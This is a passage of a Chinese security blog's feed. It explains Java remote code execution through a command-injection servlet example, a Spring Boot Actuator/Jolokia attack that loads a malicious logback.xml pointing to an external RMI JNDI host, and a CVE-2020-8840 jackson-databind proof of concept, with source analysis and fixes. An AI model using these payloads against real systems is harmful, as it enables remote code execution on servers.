title="题外话"></a>题外话</h2><p>&emsp;&emsp; 之前刚刚爆出漏洞的时候，笔者还曾复现过，但奈何能力有限，不能深入理解其中内涵。深表惭愧，总的来说，努力学习，安全一行任重而道远。</p><hr><h1 id="推荐学习资料"><a href="#推荐学习资料" class="headerlink" title="推荐学习资料"></a>推荐学习资料</h1><p>&emsp;&emsp; 想进行深入研究此漏洞肯定光看我这篇文章是不足的，毕竟我这这个只是Java方面上的，python、php等语言都没介绍。故此推荐，望彼有助。</p><p><strong>国内资料</strong></p><p>Python方面：<a href="https://www.anquanke.com/post/id/188172" target="_blank" rel="noopener">SSTI/沙盒逃逸详细总结</a><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a><br><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2模板注入中的一些绕过姿势</a><br>PHP方面：<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">服务端模板注入攻击 （SSTI）之浅析</a></p><p><strong>国外资料</strong></p><p>这篇总结的比较全面：<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="noopener">Server-Side Template Injection: RCE for the modern webapp</a><br>Python方面：<a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">Jinja2 template injection filter bypasses</a></p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.liangzl.com/get-article-detail-138970.html" target="_blank" rel="noopener">https://www.liangzl.com/get-article-detail-138970.html</a><br><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a><br><a href="https://cert.360.cn/report/detail?id=6125d7f75170c309de1ffdde11f86355" target="_blank" rel="noopener">https://cert.360.cn/report/detail?id=6125d7f75170c309de1ffdde11f86355</a><br><a href="https://paper.seebug.org/1107/#41" target="_blank" rel="noopener">https://paper.seebug.org/1107/#41</a><br><a href="https://ackcent.com/blog/in-depth-freemarker-template-injection/" target="_blank" rel="noopener">https://ackcent.com/blog/in-depth-freemarker-template-injection/</a><br><a href="https://www.cnblogs.com/wade-luffy/p/5996848.html" target="_blank" rel="noopener">https://www.cnblogs.com/wade-luffy/p/5996848.html</a><br><a href="https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html" target="_blank" rel="noopener">https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html</a><br><a href="https://blog.csdn.net/weixin_38964895/article/details/81381060" target="_blank" rel="noopener">https://blog.csdn.net/weixin_38964895/article/details/81381060</a><br><a href="https://blog.csdn.net/sweety820/article/details/74347068?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/sweety820/article/details/74347068?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;为什么说Java审计南在SSTI呢？&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;现行SSTI(Server-Side Te
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java SSTI" scheme="https://summersec.github.io/tags/Java-SSTI/"/>
    
  </entry>
  
  <entry>
    <title>春眠不觉晓，RCE知多少？</title>
    <link href="https://summersec.github.io/2020/03/03/%E6%98%A5%E7%9C%A0%E4%B8%8D%E8%A7%89%E6%99%93%EF%BC%8CRCE%E7%9F%A5%E5%A4%9A%E5%B0%91%EF%BC%9F/"/>
    <id>https://summersec.github.io/2020/03/03/%E6%98%A5%E7%9C%A0%E4%B8%8D%E8%A7%89%E6%99%93%EF%BC%8CRCE%E7%9F%A5%E5%A4%9A%E5%B0%91%EF%BC%9F/</id>
    <published>2020-03-03T04:42:16.000Z</published>
    <updated>2020-05-05T13:15:59.889Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>读者受众：所有人</li><li>阅读要求：30mins</li><li>文章中2620还没写完，清水川崎大佬就爆2634了，据说他还藏了很多个0day</li></ul><p><img src="https://img-blog.csdnimg.cn/20200303122905453.png" alt="在这里插入图片描述"></p><hr><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="简单案例分析RCE"><a href="#简单案例分析RCE" class="headerlink" title="简单案例分析RCE"></a>简单案例分析RCE</h2><p><img src="https://img-blog.csdnimg.cn/20200215130716340.png" alt="在这里插入图片描述"></p><p>&emsp;&emsp; 通过Java执行系统命令，与cmd中或者终端上一样执行shell命令，最典型的用法就是使用Runtime.getRuntime().exec(command)或者new ProcessBuilder(cmdArray).start()。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//漏洞源码</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">CommandExec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        String cmd = request.getParameter(<span class="string">"cmd"</span>).toString();</span><br><span class="line">        Runtime run = Runtime.getRuntime();</span><br><span class="line">        String lineStr = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process p = run.exec(cmd);</span><br><span class="line">            BufferedInputStream in = <span class="keyword">new</span> BufferedInputStream(p.getInputStream());</span><br><span class="line">            BufferedReader inBr = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                lineStr += tmpStr + <span class="string">"\n"</span>;</span><br><span class="line">                System.out.println(tmpStr);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>漏洞成因分析</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flowchat</span><br><span class="line">st&#x3D;&gt;start: 开始获取cmd参数值</span><br><span class="line">e&#x3D;&gt;end: 输出返回值</span><br><span class="line">op1&#x3D;&gt;operation: 执行命令（过程类似Runtime.getRuntime().exec(command)）</span><br><span class="line">st-&gt;op1-&gt;e</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 流程图显示的代码执行的过程，不难发现我们没有看到过滤参数，判断参数是否输入正确的一系列操作，从而导致的<code>命令执行漏洞</code>。</p><p><strong>说明：</strong></p><ol><li>process指向一个本地进程，相对于main进程来说，process指向的称为子进程。<a href="https://blog.csdn.net/dataiyangu/article/details/83988654" target="_blank" rel="noopener">^1</a></li><li>BufferedInputStream 是缓冲输入流，它继承FilterInputStream类。BufferedInputStream 的作用是为另一个输入流添加一些功能，例如，提供“缓冲功能”以及支持“mark()标记”和“reset()重置方法”。BufferedInputStream 本质上是通过一个内部缓冲区数组实现的。例如，在新建某输入流对应的BufferedInputStream后，当我们通过read()读取输入流的数据时，BufferedInputStream会将该输入流的数据分批的填入到缓冲区中。每当缓冲区中的数据被读完之后，输入流会再次填充数据缓冲区；如此反复，直到我们读完输入流数据位置。[^2]</li></ol><hr><h2 id="知识内容补充"><a href="#知识内容补充" class="headerlink" title="知识内容补充"></a>知识内容补充</h2><p> <strong>继续阅读下面的内容，你需要补充更多知识。</strong></p><ol><li>Java序列化和反序列化</li><li>RMI、JRMP、JMX、JNDI</li><li>JNDI注入原理</li></ol><p>笔者在此，做一个简单介绍。</p><ul><li>Java序列化对象因其可以方便的将对象转换成字节数组，又可以方便快速的将字节数组反序列化成Java对象而被非常频繁的被用于Socket传输。 在RMI(Java远程方法调用-Java Remote Method Invocation)和JMX(Java管理扩展-Java Management Extensions)服务中对象反序列化机制被强制性使用。在Http请求中也时常会被用到反序列化机制，如：直接接收序列化请求的后端服务、使用Base编码序列化字节字符串的方式传递等。</li><li>Java RMI用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟上中的对象的方法，只不过是允许被远程调用的对象要通过一些标志加以标识。</li><li>JRMP（ Java Remote Method Protocol）协议通信，用于规范远程方法调用的协议</li><li>Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</li><li>关于JNDI注入百度有很多文章，推荐<a href="https://www.freebuf.com/column/189835.html" target="_blank" rel="noopener">深入理解JNDI注入与Java反序列化漏洞利用</a>、<a href="https://xz.aliyun.com/t/6633" target="_blank" rel="noopener">JNDI注入原理及利用</a></li></ul><p><strong>推荐文章：</strong></p><ul><li><a href="https://javasec.org/javase/JavaDeserialization/Serialization.html" target="_blank" rel="noopener">Java 序列化/反序列化</a></li><li><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI</a></li><li><a href="https://xz.aliyun.com/t/7264" target="_blank" rel="noopener">搞懂RMI、JRMP、JNDI-终结篇</a></li><li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">MicroFocus研究论文(纯英文)</a></li><li><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">Exploiting JNDI Injections in Java</a></li></ul><hr><h2 id="Spring-Boot-Actuators-to-RCE"><a href="#Spring-Boot-Actuators-to-RCE" class="headerlink" title="Spring Boot Actuators to RCE"></a>Spring Boot Actuators to RCE</h2><p>&emsp;&emsp; Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息。</p><p>&emsp;&emsp; 使用老外提供的源码，用mvn编译运行。<a href="https://github.com/veracode-research/actuator-testbed" target="_blank" rel="noopener">GitHub项目地址</a>直接访问<code>http://127.0.0.1:8090/jolokia/list</code><br>或者修改ip和端口<code>actuator-testbed\src\main\resources\application.properties</code></p><p><img src="https://img-blog.csdnimg.cn/20200225152718508.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225152401453.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228131827582.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 上面的<code>reloadByURL</code>可以加载一个外部URL进而重新加载日志配置，结果造成了RCE。我们需要构造一个恶意logback.xml的URL。<br><code>http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/httpserver_ip/logback.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//下面是logback.xml内容</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">"rmi://artsploit.com:1389/jndi"</span> <span class="attr">as</span>=<span class="string">"appName"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>rmi和ldap服务都能触发这个漏洞，笔者在这里选择rmi服务。</p><p><img src="https://img-blog.csdnimg.cn/20200227143151844.gif" alt="在这里插入图片描述"><br><strong>简单的触发流程流程图：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flowchat</span><br><span class="line">st&#x3D;&gt;start: Spring-boot-actuator</span><br><span class="line">e&#x3D;&gt;end: RCE</span><br><span class="line">op&#x3D;&gt;operation: Jolokia</span><br><span class="line">op2&#x3D;&gt;operation: RMI</span><br><span class="line">cond&#x3D;&gt;condition: logback.xml?</span><br><span class="line"></span><br><span class="line">st-&gt;op-&gt;op2-&gt;cond</span><br><span class="line">cond(yes)-&gt;e</span><br><span class="line">cond(no)-&gt;op2</span><br></pre></td></tr></table></figure><hr><p><strong>源码分析</strong></p><ol><li>第一步会先注册jolokia<br><img src="https://img-blog.csdnimg.cn/20200229132647972.png#pic_center" alt="在这里插入图片描述"></li><li><a href="http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/httpserver_ip/logback.xml" target="_blank" rel="noopener">http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/httpserver_ip/logback.xml</a><br>看上面URL分析<code>reloadByURL</code>很重要，看一下源码<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reloadByURL</span><span class="params">(URL url)</span> <span class="keyword">throws</span> JoranException </span>&#123;</span><br><span class="line">       StatusListenerAsList statusListenerAsList = <span class="keyword">new</span> StatusListenerAsList();</span><br><span class="line"></span><br><span class="line">       addStatusListener(statusListenerAsList);</span><br><span class="line">       addInfo(<span class="string">"Resetting context: "</span> + loggerContext.getName());</span><br><span class="line">       loggerContext.reset();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// after a reset the statusListenerAsList gets removed as a listener</span></span><br><span class="line">       addStatusListener(statusListenerAsList);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (url != <span class="keyword">null</span>) &#123;</span><br><span class="line">               JoranConfigurator configurator = <span class="keyword">new</span> JoranConfigurator();</span><br><span class="line">               configurator.setContext(loggerContext);</span><br><span class="line">               configurator.doConfigure(url);</span><br><span class="line">               addInfo(<span class="string">"Context: "</span> + loggerContext.getName() + <span class="string">" reloaded."</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           removeStatusListener(statusListenerAsList);</span><br><span class="line">           <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">               StatusPrinter.print(statusListenerAsList.getStatusList());</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>不难发现下面三行代码是关键，重置日志配置。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addStatusListener(statusListenerAsList);</span><br><span class="line">      addInfo(<span class="string">"Resetting context: "</span> + loggerContext.getName());</span><br><span class="line">      loggerContext.reset();</span><br></pre></td></tr></table></figure></li></ol><p><strong>推荐文章</strong></p><p><a href="https://xz.aliyun.com/t/4258" target="_blank" rel="noopener">spring boot actuator rce via jolokia</a><br><a href="https://www.anquanke.com/post/id/173265" target="_blank" rel="noopener">Attack Spring Boot Actuator via jolokia Part 2</a><a href="https://xz.aliyun.com/t/4259" target="_blank" rel="noopener">关于此漏洞更多的骚操作参考</a></p><hr><p><strong>代码审计关键词</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">trace</span><br><span class="line">health</span><br><span class="line">loggers</span><br><span class="line">metrics</span><br><span class="line">autoconfig</span><br><span class="line">heapdump</span><br><span class="line">threaddump</span><br><span class="line">env</span><br><span class="line">info</span><br><span class="line">dump</span><br><span class="line">configprops</span><br><span class="line">mappings</span><br><span class="line">auditevents</span><br><span class="line">beans</span><br><span class="line">jolokia</span><br><span class="line">cloudfoundryapplication</span><br><span class="line">hystrix.stream</span><br><span class="line">actuator</span><br><span class="line">actuator&#x2F;auditevents</span><br><span class="line">actuator&#x2F;beans</span><br><span class="line">actuator&#x2F;health</span><br><span class="line">actuator&#x2F;conditions</span><br><span class="line">actuator&#x2F;configprops</span><br><span class="line">actuator&#x2F;env</span><br><span class="line">actuator&#x2F;info</span><br><span class="line">actuator&#x2F;loggers</span><br><span class="line">actuator&#x2F;heapdump</span><br><span class="line">actuator&#x2F;threaddump</span><br><span class="line">actuator&#x2F;metrics</span><br><span class="line">actuator&#x2F;scheduledtasks</span><br><span class="line">actuator&#x2F;httptrace</span><br><span class="line">actuator&#x2F;mappings</span><br><span class="line">actuator&#x2F;jolokia</span><br><span class="line">actuator&#x2F;hystrix.stream</span><br></pre></td></tr></table></figure><hr><p><strong>防护措施</strong><br>&emsp;&emsp; 在使用Actuator时，不正确的使用或者一些不经意的疏忽，就会造成严重的信息泄露等安全隐患。在代码审计时如果是springboot项目并且遇到actuator依赖，则有必要对安全依赖及配置进行复查。也可作为一条规则添加到黑盒扫描器中进一步把控。<br>&emsp;&emsp; 安全的做法是一定要引入security依赖，打开安全限制并进行身份验证。同时设置单独的Actuator管理端口并配置不对外网开放。<br>更多防护措施参考<a href="https://xz.aliyun.com/t/2233" target="_blank" rel="noopener">SpringBoot应用监控Actuator使用的安全隐患</a></p><hr><h2 id="CVE-2020-8840-FasterXML-jackson-databind-远程代码执行漏洞"><a href="#CVE-2020-8840-FasterXML-jackson-databind-远程代码执行漏洞" class="headerlink" title="CVE-2020-8840 FasterXML/jackson-databind 远程代码执行漏洞"></a>CVE-2020-8840 FasterXML/jackson-databind 远程代码执行漏洞</h2><p><strong>&emsp;&emsp; FasterXML/jackson-databind是一个用于JSON和对象转换的Java第三方库，可将Java对象转换成json对象和xml文档，同样也可将json对象转换成Java对象。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//漏洞POC</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line"></span><br><span class="line">        String json = <span class="string">"[\"org.apache.xbean.propertyeditor.JndiConverter\", &#123;\"asText\":\"ldap://localhost:1389/Exploit\"&#125;]"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(json, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200227143135510.gif" alt="在这里插入图片描述"></p><hr><p>我们查看官方的漏洞源码提交修复记录<a href="https://github.com/FasterXML/jackson-databind/commit/914e7c9f2cb8ce66724bf26a72adc7e958992497" target="_blank" rel="noopener">GitHub地址</a>分析。<br><img src="https://img-blog.csdnimg.cn/20200302161840124.png" alt="在这里插入图片描述"></p><ul><li>查看POC ，找到JndiConverter类<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String json = <span class="string">"[\"org.apache.xbean.propertyeditor.JndiConverter\",&#123;\"asText\":\"ldap://localhost:1389/Exploit\"&#125;]"</span>;</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20200302190911380.png" alt="在这里插入图片描述"></li><li>查看类的继承关系，找到AbstractConverter类</li></ul><p><img src="https://img-blog.csdnimg.cn/20200302191128920.png#pic_center" alt="在这里插入图片描述"></p><ul><li>找到toObject方法，证据不足，继续溯源。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">toObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Object value = <span class="keyword">this</span>.toObjectImpl(<span class="keyword">this</span>.trim ? text.trim() : text);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li>证据充分，此是内奸。重置text内容导致RCE。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setAsText</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.toObject(<span class="keyword">this</span>.trim ? text.trim() : text);</span><br><span class="line">        <span class="keyword">super</span>.setValue(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20200302192146603.png" alt="在这里插入图片描述"></li></ul><hr><p><strong>思路整理</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flowchat</span><br><span class="line">st&#x3D;&gt;start: 开始</span><br><span class="line">e1&#x3D;&gt;end: 结束</span><br><span class="line">e2&#x3D;&gt;end: RCE</span><br><span class="line">op1&#x3D;&gt;operation: POC字符串</span><br><span class="line">op2&#x3D;&gt;operation: JndiConverter-&gt;toObjectImpl方法</span><br><span class="line">op3&#x3D;&gt;operation: AbstractConverter-&gt;setAsText方法</span><br><span class="line">op4&#x3D;&gt;operation: 请求ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit</span><br><span class="line">op5&#x3D;&gt;operation: Send LDAP reference result for Exploit redirecting to http:&#x2F;&#x2F;localhost:8080&#x2F;Exploit.class</span><br><span class="line">op6&#x3D;&gt;operation: http:&#x2F;&#x2F;localhost:8080&#x2F;Exploit.class</span><br><span class="line">cond&#x3D;&gt;condition: RCE？</span><br><span class="line"></span><br><span class="line">st-&gt;op1-&gt;op2-&gt;op3-&gt;cond-&gt;op4-&gt;op5-&gt;op6-&gt;e2</span><br><span class="line">cond(yes)-&gt;op4</span><br><span class="line">cond(no)-&gt;e1</span><br></pre></td></tr></table></figure><hr><p><strong>修复方式</strong><br>4. 升级 jackson-databind 至2.9.10.3、2.8.11.5、2.10.x<br>5. 排查项目中是否使用 xbean-reflect。该次漏洞的核心原因是xbean-reflect 中存在特殊的利用链允许用户触发 JNDI 远程类加载操作。将xbean-reflect移除可以缓解漏洞所带来的影响。</p><hr><h1 id="推荐几个历史版本RCE"><a href="#推荐几个历史版本RCE" class="headerlink" title="推荐几个历史版本RCE"></a>推荐几个历史版本RCE</h1><ol><li>com.threedr3am.bug.fastjson.FastjsonSerialize(TemplatesImpl) 利用条件：fastjson &lt;= 1.2.24 + Feature.SupportNonPublicField</li><li>com.threedr3am.bug.fastjson.NoNeedAutoTypePoc 利用条件：fastjson &lt; 1.2.48 不需要任何配置，默认配置通杀RCE</li><li>com.threedr3am.bug.fastjson.HikariConfigPoc(HikariConfig) 利用条件：fastjson &lt;= 1.2.59 RCE，需要开启AutoType</li><li>com.threedr3am.bug.fastjson.CommonsProxyPoc(SessionBeanProvider) 利用条件：fastjson &lt;= 1.2.61 RCE，需要开启AutoType</li><li>cas-4.1.x~4.1.6 反序列化漏洞（利用默认密钥）</li><li>cas-4.1.7~4.2.x 反序列化漏洞（需要知道加密key和签名key）</li></ol><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/JoyChou93/java-sec-code/wiki" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki</a><br><a href="http://www.jianfensec.com/70.html" target="_blank" rel="noopener">http://www.jianfensec.com/70.html</a><br><a href="https://www.cnblogs.com/tr1ple/p/12348886.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/12348886.html</a><br>[^2]: <a href="https://www.cnblogs.com/isme-zjh/p/11506495.html" target="_blank" rel="noopener">https://www.cnblogs.com/isme-zjh/p/11506495.html</a><br><a href="https://github.com/jas502n/CVE-2020-8840" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2020-8840</a><br><a href="https://github.com/fairyming/CVE-2020-8840" target="_blank" rel="noopener">https://github.com/fairyming/CVE-2020-8840</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;读者受众：所有人&lt;/li&gt;
&lt;li&gt;阅读要求：30mins&lt;/li&gt;
&lt;li&gt;文章中2620还没写完，清水川崎大佬就爆2634了
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="JavaRCE" scheme="https://summersec.github.io/tags/JavaRCE/"/>
    
  </entry>
  
  <entry>
    <title>CNVD-2020-10487(CVE-2020-1938)tomcat ajp 文件读取漏洞</title>
    <link href="https://summersec.github.io/2020/02/23/CNVD-2020-10487(CVE-2020-1938)tomcat%20ajp%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://summersec.github.io/2020/02/23/CNVD-2020-10487(CVE-2020-1938)tomcat%20ajp%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-02-23T11:01:42.000Z</published>
    <updated>2020-05-05T13:12:11.954Z</updated>
    
